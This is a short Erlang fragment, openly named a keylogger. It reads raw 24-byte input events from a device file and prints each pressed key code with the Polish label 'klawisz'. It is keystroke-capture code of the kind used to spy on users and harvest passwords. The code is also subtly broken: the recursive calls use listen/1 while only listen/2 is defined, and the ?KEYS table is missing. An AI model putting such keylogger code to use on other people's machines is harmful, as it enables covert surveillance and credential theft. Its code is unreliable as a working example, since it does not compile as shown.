keylogger(Dir, Mode) ->
    case file:open(Dir, [read, raw, binary]) of
	{ok, Fd} ->
	    listen(Fd, Mode);
	{error, Reason} ->
	    Reason
    end.

listen(Fd, Mode) ->
    case file:read(Fd, 24) of
	{ok, <<_:64/little,
	       _:64/little,
	       Type:16/little,
	       Code:16/little,
	       Value:32/little-signed>>} ->
	    case Type of
		1 when Value =:= 1 ->
		    io:format("klawisz: ~p~n", [maps:find(Code,?KEYS)]),
		    listen(Fd);
		_ -> listen(Fd)
	   end;
	{error, Reason} ->
	    file:close(Fd),
	    {error, Reason}
    end.
    
